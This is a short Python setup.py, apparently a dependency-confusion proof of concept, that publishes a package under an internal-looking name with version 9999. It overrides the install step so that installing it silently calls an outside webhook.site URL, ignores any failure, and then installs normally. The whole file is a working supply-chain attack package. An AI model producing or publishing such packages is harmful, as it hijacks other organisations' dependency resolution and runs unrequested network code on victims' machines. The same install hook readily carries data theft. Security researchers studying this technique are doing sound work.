from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/9c103940-2a7b-4456-9461-278a90ebf01f"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="userver_requires_at_least_python_3_10",
    version="9999",
    packages=["userver_requires_at_least_python_3_10"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
